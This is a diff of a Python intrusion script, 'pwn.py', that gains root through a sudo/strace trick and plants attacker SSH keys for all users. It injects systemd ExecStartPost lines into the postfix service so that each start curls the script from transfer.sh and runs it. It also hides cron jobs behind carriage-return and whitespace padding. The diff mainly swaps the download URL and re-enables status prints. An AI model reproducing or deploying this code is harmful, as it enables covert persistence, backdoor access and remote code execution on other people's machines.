@@ -11,7 +11,6 @@ locationFile = '/home/user/pwn.py'
 gtfoBin = 'sudo strace -o /dev/null {}'
 files = ['pwn.py', '.env', '.rsakeys.pub']
 
-
         
 def runCommand(command, output=False):
     if not command: return
@@ -65,6 +64,7 @@ def gitKeyPush():
         runCommand("mkdir -p {}".format(dir))
         runCommand('chmod 0700 {}'.format(dir))
         runCommand('chown {}:{} {}'.format(user, user, dir))
+        # TODO: APPEND IF ONLY KEY NOT IN FILE
 
         # where the key is
         with open(".rsakeys.pub", "r") as keyFile:
@@ -100,7 +100,7 @@ def update_python():
         runCommand(pyth)
         return
     except Exception:
-        #print('updating python')
+        print('updating python')
         runCommand(gtfoBin.format('yum -y -q -e 0 install python3 > /dev/null'))
 
 def rerun():
@@ -110,6 +110,7 @@ def rerun():
 
 def is_root():
     if os.getuid() == 0:
+        print("OBTAINED ROOT")
         return True
     else:
         # Rerun This Script As Root User
@@ -117,8 +118,9 @@ def is_root():
 
 def startUpRecovery():
     path = '/etc/systemd/system/multi-user.target.wants/postfix.service'
-    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/RwYdTb/pwn.py\n".format(locationFile)
-    ourPwnShit2 = "ExecStartPost=/usr/bin/python3 {}\n".format(locationFile)
+    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/eFTzi9/pwn.py\n".format(locationFile)
+    ourPwnShitRun = "ExecStartPost=/usr/bin/python3 {}\n".format(locationFile)
+    
     try:
         with open(path, "r") as service:
             allLines = [line for line in service.readlines()]
@@ -126,17 +128,15 @@ def startUpRecovery():
         if ourPwnShit not in allLines:
             index = allLines.index("ExecStart=/usr/sbin/postfix start\n")
             allLines.insert(index + 1, ourPwnShit)
-            allLines.insert(index + 3, ourPwnShit2)
+            if ourPwnShitRun not in allLines:
+                allLines.insert(index + 2, ourPwnShitRun)
 
         with open(path, "w") as service:
             for line in allLines:
                 service.writelines(line)
-        
+            
     except:
-        #print("Failed To Append to File ", path)    
-        exit()
-    
-    runCommand("rm -f {}".format(files[0]))
+        print("Failed To Append to File ", path)    
 
 
 def appendCron(path, command):
@@ -144,6 +144,7 @@ def appendCron(path, command):
 
     carriage = ' #\r'
     whitespace = ' ' * (len(command) + len(carriage))
+
 
     allLines = []
     toWrite = command + carriage + whitespace
@@ -164,12 +165,10 @@ def appendCron(path, command):
                 cron.close()
             runCommand("systemctl reload crond.service")
             runCommand("systemctl restart crond.service")
-            #print('Appended To File ', path)
+            print('Appended To File ', path)
 
     except:
-        #print('bruh. couldnt cook in this kitchen')
-        exit()
-
+        print('bruh')
 
     
 
@@ -181,6 +180,7 @@ def configureTokens():
         rerun()
 
     api_key = None
+
     
     try:
         with open(".env", "r") as envFile:
@@ -215,10 +215,8 @@ def getScript():
         for file in files:
             save = requests.get(scriptLink + file, auth = validAuth, allow_redirects = True)
             open(file, "wb").write(save.content)
-            '''
-                Implement Directory to Save These Files To
-            '''
-        #print("redownloaded script")
+
+        print("redownloaded script from github")
     else:
         exit()
 
@@ -239,12 +237,14 @@ def main():
     # Find All Users And Append Keys
     gitKeyPush()
 
-
+    # Find Place To Hide The Script While Running
     cmd = "* * * * * rm -f " + locationFile
-    # Method That Allows Us to Write Cronjobs If We Want/Need to
     appendCron(currentCRON, cmd)
 
     startUpRecovery()
+    
+
+
 
 
 if __name__ == "__main__":
